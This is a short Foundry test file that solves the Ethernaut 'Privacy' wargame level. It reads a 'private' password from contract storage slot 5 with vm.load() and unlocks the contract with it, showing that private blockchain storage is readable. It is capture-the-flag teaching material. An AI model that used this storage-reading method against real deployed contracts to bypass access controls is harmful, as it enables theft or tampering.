// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Privacy.sol";

// vm.load() + storage slot packing
contract PrivacyTest is Test {
    Privacy instance;
    // Privacy instance = Privacy(vm.envAddress("PRIVACY"));

    function test(bytes32[3] memory _data) public {
        instance = new Privacy(_data);
        assertEq(instance.locked(), true);

        // 6th element, for storage slot packing
        bytes16 password = bytes16(
            vm.load(address(instance), bytes32(uint256(5)))
        );
        console.logBytes16(password);
        instance.unlock(password);

        assertEq(instance.locked(), false);
    }
}
